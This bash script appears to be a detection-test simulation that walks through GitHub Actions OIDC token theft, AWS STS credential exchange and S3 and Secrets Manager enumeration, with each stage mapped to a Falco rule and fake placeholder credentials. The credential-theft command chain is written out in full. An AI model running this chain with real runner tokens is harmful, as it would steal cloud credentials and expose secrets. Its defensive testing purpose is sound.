#!/usr/bin/env bash
# =============================================================================
# GitHub Actions OIDC Token Theft and Cloud Pivot
# Safe simulation of OIDC JWT acquisition and cloud credential exchange.
#
# SAFE: All network calls fail gracefully (|| true).
#       OIDC endpoint URL is fake — connection will be refused or timeout.
#       STS call targets real endpoint but with a fake JWT — returns error.
#       AWS CLI commands fail without valid credentials.
#
# Each stage maps to one Falco rule. Unlike teampcp-trivy IMDS theft, this
# technique works on GitHub-hosted runners where IMDS is not AWS-backed.
# =============================================================================

set -uo pipefail

BOLD='\033[1m'
RESET='\033[0m'
RED='\033[0;31m'
YELLOW='\033[0;33m'

echo -e "${BOLD}GitHub Actions OIDC Token Theft and Cloud Pivot${RESET}"
echo "Simulating OIDC JWT acquisition → STS token exchange → cloud enumeration"
echo "Note: works even on GitHub-hosted runners (Azure) where IMDS returns Azure metadata"
echo ""

# =============================================================================
# Stage 1: OIDC Token URL Discovery
# Read ACTIONS_ID_TOKEN_REQUEST_URL and ACTIONS_ID_TOKEN_REQUEST_TOKEN from env.
# On a real runner with id-token: write, these are populated by GitHub.
# Expected rule: OIDC Token Request Variable Discovery (WARNING)
# =============================================================================
echo -e "${BOLD}=== Stage 1: OIDC Token Request URL Discovery ===${RESET}"
echo "Simulating: printenv ACTIONS_ID_TOKEN_REQUEST_URL / ACTIONS_ID_TOKEN_REQUEST_TOKEN"
echo ""

printenv ACTIONS_ID_TOKEN_REQUEST_URL    2>/dev/null || echo "(not set — workflow needs id-token: write permission)"
printenv ACTIONS_ID_TOKEN_REQUEST_TOKEN  2>/dev/null || echo "(not set — workflow needs id-token: write permission)"

echo -e "${YELLOW}Expected rule: OIDC Token Request Variable Discovery (WARNING)${RESET}"
echo ""
sleep 1

# =============================================================================
# Stage 2: GitHub OIDC JWT Acquisition
# HTTP GET to the GitHub Actions OIDC token endpoint with Bearer auth.
# The URL contains pipelines.actions.githubusercontent.com + idtoken —
# both strings are in proc.cmdline and trigger the rule.
# SAFE: endpoint does not exist — curl times out or gets connection refused.
# Expected rule: GitHub Actions OIDC JWT Acquisition (CRITICAL)
# =============================================================================
echo -e "${BOLD}=== Stage 2: GitHub OIDC JWT Acquisition ===${RESET}"
echo "Simulating: curl to GitHub OIDC token endpoint"
echo "Note: on a runner with id-token: write, this returns a real signed JWT"
echo ""

FAKE_OIDC_URL="https://pipelines.actions.githubusercontent.com/simulation/idtoken?audience=sts.amazonaws.com"
FAKE_REQUEST_TOKEN="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

curl -sf --max-time 3 \
  -H "Authorization: bearer ${FAKE_REQUEST_TOKEN}" \
  "${FAKE_OIDC_URL}" \
  2>/dev/null || true

echo -e "${RED}Expected rule: GitHub Actions OIDC JWT Acquisition (CRITICAL)${RESET}"
echo ""
sleep 1

# =============================================================================
# Stage 3: AWS STS OIDC Token Exchange
# POST the OIDC JWT to AWS STS AssumeRoleWithWebIdentity.
# The STS endpoint is reachable — the call fails because the JWT is fake,
# but spawned_process fires and proc.cmdline contains the detection strings.
# Expected rule: AWS STS OIDC Token Exchange in CI Runner (CRITICAL)
# =============================================================================
echo -e "${BOLD}=== Stage 3: AWS STS AssumeRoleWithWebIdentity ===${RESET}"
echo "Simulating: exchange OIDC JWT for temporary AWS credentials via STS"
echo "Note: STS rejects the fake JWT — connection succeeds, authentication fails"
echo ""

FAKE_JWT="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.SIMULATION.FAKE_SIGNATURE"
FAKE_ROLE_ARN="arn:aws:iam::123456789012:role/GitHubActionsRole-simulation"

curl -sf --max-time 5 \
  "https://sts.amazonaws.com/?Action=AssumeRoleWithWebIdentity\
&WebIdentityToken=${FAKE_JWT}\
&RoleArn=${FAKE_ROLE_ARN}\
&RoleSessionName=GitHubActions-simulation\
&Version=2011-06-15" \
  2>/dev/null || true

echo -e "${RED}Expected rule: AWS STS OIDC Token Exchange in CI Runner (CRITICAL)${RESET}"
echo ""
sleep 1

# =============================================================================
# Stage 4: Cloud Resource Enumeration
# Use the (fake) temporary credentials to enumerate S3 and Secrets Manager.
# AWS CLI commands fail without valid credentials but spawned_process fires.
# Expected rule: Cloud Secrets Enumeration with Temporary CI Credentials (CRITICAL)
# =============================================================================
echo -e "${BOLD}=== Stage 4: Cloud Resource Enumeration ===${RESET}"
echo "Simulating: aws s3 ls and aws secretsmanager list-secrets"
echo "Note: AWS CLI fails without valid credentials — spawned_process events still fire"
echo ""

AWS_ACCESS_KEY_ID="AKIASIMULATION00000001" \
AWS_SECRET_ACCESS_KEY="FAKESECRETKEY+simulation/notreal/AAAAAAAAAA" \
AWS_SESSION_TOKEN="FAKESESSIONTOKEN" \
  aws s3 ls 2>/dev/null || true

AWS_ACCESS_KEY_ID="AKIASIMULATION00000001" \
AWS_SECRET_ACCESS_KEY="FAKESECRETKEY+simulation/notreal/AAAAAAAAAA" \
AWS_SESSION_TOKEN="FAKESESSIONTOKEN" \
  aws secretsmanager list-secrets --region us-east-1 2>/dev/null || true

echo -e "${RED}Expected rule: Cloud Secrets Enumeration with Temporary CI Credentials (CRITICAL)${RESET}"
echo ""

# =============================================================================
echo -e "${BOLD}=== Simulation Complete ===${RESET}"
echo ""
echo "Rules expected to fire:"
echo "  WARNING   OIDC Token Request Variable Discovery"
echo "  CRITICAL  GitHub Actions OIDC JWT Acquisition"
echo "  CRITICAL  AWS STS OIDC Token Exchange in CI Runner"
echo "  CRITICAL  Cloud Secrets Enumeration with Temporary CI Credentials"
echo ""
echo "Detection advantage over IMDS (teampcp-trivy):"
echo "  IMDS fires on fd.sip=169.254.169.254 (blocked on GitHub-hosted runners)"
echo "  OIDC fires on proc.cmdline strings — works on all runner types"
